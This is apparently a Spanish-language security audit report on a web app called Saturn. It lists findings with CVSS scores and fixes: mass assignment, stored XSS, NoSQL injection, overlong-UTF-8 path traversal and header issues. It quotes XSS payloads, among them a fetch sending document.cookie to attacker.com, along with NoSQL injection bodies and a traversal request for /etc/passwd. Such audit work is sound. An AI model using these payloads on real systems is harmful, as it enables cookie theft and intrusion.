🚩 Hallazgos de Seguridad

Clasificados por severidad (CVSS v3.1). Los hallazgos marcados con 🔒 fueron corregidos durante la auditoría.

C-001: Mass Assignment — Elevación de Privilegios 🔴 CRÍTICO CVSS 8.8 [CORREGIDO 🔒]

Endpoint POST /api/admin/create acepta cualquier rol en el body.

Request: {"username":"attacker","password":"pass1234","role":"superadmin"}
Response: HTTP 200 — Usuario creado con role="superadmin"
✕ Antes: role="superadmin" aceptado
✓ Después: role forzado a "admin" (hardcodeado en backend)

Impacto: Cualquier usuario (sin auth) puede crear admins con cualquier rol.

Código: src/routes/auth.ts:router.post("/create") — no validaba el campo role

Fix: const role = "admin"; — el rol se fija en backend, ignorando el input.

C-002: XSS Almacenado en Username 🟡 MEDIO CVSS 6.1 [CORREGIDO 🔒]

13/13 payloads XSS aceptados como username y almacenados en DB.

Payloads exitosos:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
><script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
fetch("http://attacker.com/steal?c="+document.cookie)
eval(atob("YWxlcnQoMSk="))
✕ Antes: <script>alert(1)</script> → HTTP 200, almacenado
✓ Después: /[<>"&]/.test(username) → HTTP 400, rechazado

Impacto real: React escapa HTML por defecto → no ejecutable en frontend. Riesgo si se exporta a logs, reportes PDF, o CSV.

Fix: Regex /[<>"&]/.test(username) — rechaza caracteres HTML.

C-003: NoSQL Injection → HTTP 500 🟡 MEDIO CVSS 5.3

Payloads de NoSQL Injection causan HTTP 500 en el endpoint de login.

{"username": {"$gt": ""}, "password": "test"} → HTTP 500
{"username": {"$ne": ""}, "password": "test"} → HTTP 500
{"username": {"$where": "1==1"}, "password": "test"} → HTTP 500

Causa: Express.json() parsea el body como objeto, pero SQLite no entiende {"$gt":""}. El error no se captura antes de llegar a la DB.

Impacto: No hay bypass de auth (SQLite no implementa $gt). El 500 revela inestabilidad.

Recomendación: Validar typeof username === 'string' antes de la consulta.

C-004: Unicode Path Traversal → HTTP 500 🟡 MEDIO CVSS 4.3

Overlong UTF-8 encoding de "." causa HTTP 500 en path traversal.

GET /api/contextp/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd → HTTP 500

Causa: Express.decodeURIComponent no maneja overlong UTF-8 sequences.

Impacto: No hay fuga de datos (Express normaliza), pero el 500 revela error interno del parser.

Recomendación: Middleware que normalice paths y rechace overlong UTF-8 antes de routing.

C-005: CORS Wildcard 🟡 MEDIO CVSS 5.1 [CORREGIDO 🔒]

Access-Control-Allow-Origin: * permite cualquier sitio web externo.

Header: Access-Control-Allow-Origin: *
→ Cualquier sitio puede hacer fetch() a la API desde el navegador de un admin

Impacto: Un atacante podría crear un sitio malicioso que, si el admin lo visita mientras está logueado en Saturn, haga peticiones API en su nombre (CSRF).

Fix: cors({ origin: "http://192.168.174.134:3000" })

C-006: HSTS no configurado 🔵 BAJO CVSS 3.7

Header Strict-Transport-Security ausente.

Header faltante: Strict-Transport-Security
→ Sin HSTS, un atacante MITM puede hacer downgrade a HTTP

Impacto: Bajo en la red actual (192.168.174.x, sin exposición a internet). Crítico si se expone a internet.

Recomendación: Configurar en helmet: hsts: { maxAge: 31536000, includeSubDomains: true }

C-007: X-XSS-Protection deshabilitado 🔵 BAJO CVSS 3.3

X-XSS-Protection: 0 — protección deshabilitada.

Header: X-XSS-Protection: 0
→ Navegadores legacy (IE, Safari antiguo) no protegen contra XSS reflejado

Recomendación: Cambiar a X-XSS-Protection: 1; mode=block en helmet.

C-008: Permissions-Policy no configurado 🔵 BAJO CVSS 2.1

Header Permissions-Policy ausente.

Header faltante: Permissions-Policy
→ No se controla qué APIs del navegador pueden usar los scripts embebidos

Recomendación: Permissions-Policy: camera=(), microphone=(), geolocation=()
